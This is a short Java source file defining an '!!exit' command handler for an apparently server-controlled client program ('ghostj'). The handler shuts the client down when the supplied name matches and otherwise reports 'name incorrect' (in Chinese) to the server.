package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.core.HandleConn;

public class FuncExit implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!exit";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<fullName>"};
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        if(params[0].equals(ClientMain.name)){
            HandleConn.sendFinishToServer();
            System.exit(0);
        }else {
            HandleConn.writeToServer("名称不正确");
            HandleConn.sendFinishToServer();
        }
    }
}
